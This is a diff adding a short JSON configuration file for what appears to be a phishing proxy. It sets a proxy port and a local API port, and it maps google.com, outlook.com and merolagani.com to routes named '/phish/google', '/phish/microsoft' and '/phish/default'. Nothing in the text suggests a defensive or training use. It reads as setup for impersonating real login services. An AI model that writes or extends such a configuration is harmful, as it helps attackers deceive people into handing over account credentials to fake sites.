@@ -1,0 +1,16 @@
+{
+    "proxy_port": 8080,
+    "api_port": 9000,
+    "internal_host": "http://127.0.0.1:9000",
+    "settings": {
+        "google.com": {
+            "route": "/phish/google"
+        },
+        "outlook.com": {
+            "route": "/phish/microsoft"
+        },
+        "merolagani.com": {
+            "route": "/phish/default"
+        }
+    }
+}
